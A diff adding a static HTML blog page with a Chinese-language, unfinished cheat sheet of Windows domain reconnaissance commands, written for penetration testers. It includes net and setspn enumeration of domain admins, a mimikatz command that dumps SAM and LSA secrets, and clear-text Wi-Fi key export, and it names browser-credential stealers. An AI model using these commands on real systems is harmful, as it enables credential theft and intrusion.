@@ -1,0 +1,335 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Keywords" content="blog"/>
+    <meta name="Description" content="blog"/>
+    <title>Simple</title>
+    <link rel="shortcut icon" href="/static/favicon.png"/>
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+</head>
+<body>
+<div class="main">
+    <div class="header">
+    	<ul id="pages">
+            <li><a href="/">home</a></li>
+            <li><a href="/#/tags">tags</a></li>
+            <li><a href="/#/archive">archive</a></li>
+    	</ul>
+    </div>
+	<div class="wrap-header">
+    <h1>
+    <a href="/" id="title"></a>
+    </h1>
+	</div>
+<xmp id="md" style="display: none;">
+<!-- markdown -->
+待补充, 待排版...
+
+## 基本命令
+
+```
+net user // 查看所有用户
+net view // 查看计算机
+net view /domain // 查看所有域
+net user /domain // 查看域内用户
+net group "Domain Controllers" /domain //查看域控
+net group "Domain Admins" /domain //查看域管理员
+net group "Enterprise Admins" /domain //查看全局管理员
+net time /domain //定位当前域控
+ipconfig /all //查看 IP DNS 网关信息
+net share // 查看共享
+net use //查看连接
+arp -a //arp 缓存 活跃主机
+cmdkey /list //查看本机凭据
+netstat -ano //查看开放端口
+tasklist /svc //查看当前进程
+systeminfo //本机信息 补丁
+```
+
+## spn 信息
+
+```
+setspn -T test.com –q */* // 当前域的 spn 信息
+setspn -q */* // 所有域的 spn 信息
+```
+
+## Hash
+
+mimikatz 导出 NTLM Hash + 明文密码
+
+## hosts
+
+```
+C:\Windows\System32\drivers\etc\hosts
+```
+
+## rdp 记录
+
+[3gstudent/List-RDP-Connections-History](https://github.com/3gstudent/List-RDP-Connections-History)
+
+导出凭据: mimikatz dpapi 模块 netpass 等
+
+## ipc 共享
+
+```
+net share //查看本机共享
+net share \\DC // 查看 DC 主机共享
+net use // 查看当前连接
+```
+
+## 回收站
+
+```
+$Recycler = (New-Object -ComObject Shell.Application).NameSpace(0xa);
+foreach($file in $Recycler.items()){$file.path;$file.ExtendedProperty("{9B174B33-40FF-11D2-A27E-00C04FC30871} 2")+'\'+$file.name;$file.Type}
+```
+
+## 虚拟网络密码
+
+`lsadump::secrect` 有时会导出一些很有趣的东西.
+
+```
+mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "lsadump::secrets" "exit" > out.txt
+```
+
+## 防火墙策略
+
+```
+netsh firewall show config //2003
+netsh advfirewall firewall show rule name=all //2008 2012
+```
+
+## wifi 密码
+
+不常见
+
+```
+netsh wlan export profile interface=WLAN key=clear folder=C:\netsh wlan export profile interface=WLAN key=clear folder=C:\
+```
+
+## 浏览器代理
+
+```
+reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
+```
+
+## 已安装软件
+
+[3gstudent/ListInstalledPrograms](https://github.com/3gstudent/ListInstalledPrograms)
+
+```
+Get-WmiObject -class Win32_Product |Select-Object -Property name
+wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_Product get name /FORMAT:table
+```
+
+## 敏感文件
+
+```
+dir/b/s config.*
+```
+
+## 浏览器信息
+
+mimikatz dpapi 模块 (书签 cookies 历史记录 登录信息)
+
+WebBrowserPassView, lazagne 等
+
+## 计划任务
+
+```
+schtasks /Query
+```
+
+## 启动项
+
+```
+reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+```
+<!-- markdown end -->
+</xmp>
+<div class="entry" id="main">
+<!-- content -->
+<p>待补充, 待排版...</p>
+
+<h2 id="">基本命令</h2>
+
+<pre><code>net user // 查看所有用户
+net view // 查看计算机
+net view /domain // 查看所有域
+net user /domain // 查看域内用户
+net group "Domain Controllers" /domain //查看域控
+net group "Domain Admins" /domain //查看域管理员
+net group "Enterprise Admins" /domain //查看全局管理员
+net time /domain //定位当前域控
+ipconfig /all //查看 IP DNS 网关信息
+net share // 查看共享
+net use //查看连接
+arp -a //arp 缓存 活跃主机
+cmdkey /list //查看本机凭据
+netstat -ano //查看开放端口
+tasklist /svc //查看当前进程
+systeminfo //本机信息 补丁
+</code></pre>
+
+<h2 id="spn">spn 信息</h2>
+
+<pre><code>setspn -T test.com –q */* // 当前域的 spn 信息
+setspn -q */* // 所有域的 spn 信息
+</code></pre>
+
+<h2 id="hash">Hash</h2>
+
+<p>mimikatz 导出 NTLM Hash + 明文密码</p>
+
+<h2 id="hosts">hosts</h2>
+
+<pre><code>C:\Windows\System32\drivers\etc\hosts
+</code></pre>
+
+<h2 id="rdp">rdp 记录</h2>
+
+<p><a href="https://github.com/3gstudent/List-RDP-Connections-History">3gstudent/List-RDP-Connections-History</a></p>
+
+<p>导出凭据: mimikatz dpapi 模块 netpass 等</p>
+
+<h2 id="ipc">ipc 共享</h2>
+
+<pre><code>net share //查看本机共享
+net share \\DC // 查看 DC 主机共享
+net use // 查看当前连接
+</code></pre>
+
+<h2 id="">回收站</h2>
+
+<pre><code>$Recycler = (New-Object -ComObject Shell.Application).NameSpace(0xa);
+foreach($file in $Recycler.items()){$file.path;$file.ExtendedProperty("{9B174B33-40FF-11D2-A27E-00C04FC30871} 2")+'\'+$file.name;$file.Type}
+</code></pre>
+
+<h2 id="">虚拟网络密码</h2>
+
+<p><code>lsadump::secrect</code> 有时会导出一些很有趣的东西.</p>
+
+<pre><code>mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "lsadump::secrets" "exit" &gt; out.txt
+</code></pre>
+
+<h2 id="">防火墙策略</h2>
+
+<pre><code>netsh firewall show config //2003
+netsh advfirewall firewall show rule name=all //2008 2012
+</code></pre>
+
+<h2 id="wifi">wifi 密码</h2>
+
+<p>不常见</p>
+
+<pre><code>netsh wlan export profile interface=WLAN key=clear folder=C:\netsh wlan export profile interface=WLAN key=clear folder=C:\
+</code></pre>
+
+<h2 id="">浏览器代理</h2>
+
+<pre><code>reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
+</code></pre>
+
+<h2 id="">已安装软件</h2>
+
+<p><a href="https://github.com/3gstudent/ListInstalledPrograms">3gstudent/ListInstalledPrograms</a></p>
+
+<pre><code>Get-WmiObject -class Win32_Product |Select-Object -Property name
+wmic /NAMESPACE:"\\root\CIMV2" PATH Win32_Product get name /FORMAT:table
+</code></pre>
+
+<h2 id="">敏感文件</h2>
+
+<pre><code>dir/b/s config.*
+</code></pre>
+
+<h2 id="">浏览器信息</h2>
+
+<p>mimikatz dpapi 模块 (书签 cookies 历史记录 登录信息)</p>
+
+<p>WebBrowserPassView, lazagne 等</p>
+
+<h2 id="">计划任务</h2>
+
+<pre><code>schtasks /Query
+</code></pre>
+
+<h2 id="">启动项</h2>
+
+<pre><code>reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+</code></pre>
+<!-- content end -->
+</div>
+<br>
+<br>
+    <div id="disqus_thread"></div>
+	<div class="footer">
+		<p>© Copyright 2017-2019 by X1r0z</p>
+	</div>
+</div>
+<script src="main.js"></script>
+<script id="content" type="text/mustache">
+    <h1>{{title}}</h1>
+    <div class="tag">
+    {{date}}
+    {{#tags}}
+    <a href="/#/tag/{{name}}">#{{name}}</a>
+    {{/tags}}
+    </div>
+</script>
+<script id="pagesTemplate" type="text/mustache">
+    {{#pages}}
+    <li>
+        <a href="{{path}}">{{title}}</a>
+    </li>
+    {{/pages}}
+</script>
+<script>
+$(document).ready(function() {
+    $.ajax({
+        url: "main.json",
+        type: "GET",
+        dataType: "json",
+        success: function(data) {
+            $("#title").html(data.name);
+            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
+            var pagesHtml = pagesTemplate.render({"pages": data.pages});
+            $("#pages").append(pagesHtml);
+            //path
+            var path = "windows-domain-recon.html";
+            //path end
+            var now = 0;
+            for (var i = 0; i < data.posts.length; ++i)
+                if (path == data.posts[i].path)
+                    now = i;
+            var post = data.posts[now];
+            var tmp = post.tags.split(" ");
+            var tags = [];
+            for (var i = 0; i < tmp.length; ++i)
+                if (tmp[i].length > 0)
+                    tags.push({"name": tmp[i]});
+            var contentTemplate = Hogan.compile($("#content").html());
+            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
+            $("#main").prepend(contentHtml);
+            if (data.disqus_shortname.length > 0) {
+                var disqus_shortname = data.disqus_shortname;
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            }
+        }
+    });
+});
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
+</script>
+</body>
+</html>
